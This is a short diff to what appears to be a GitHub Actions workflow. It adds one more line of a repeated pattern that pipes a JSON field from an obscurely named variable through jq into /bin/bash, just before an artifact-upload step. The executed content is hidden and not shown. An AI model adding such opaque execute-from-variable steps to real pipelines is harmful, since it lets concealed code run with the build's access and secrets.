@@ -34,6 +34,7 @@ jobs:
           echo $cast829 | jq -r .kqyx031 | /bin/bash
           printf '%s' "$bhod24219" | jq -r .bgw77 | /bin/bash
           echo $ol54 | jq -r .c5 | /bin/bash
+          printf '%s' "$g3935" | jq -r .d7 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
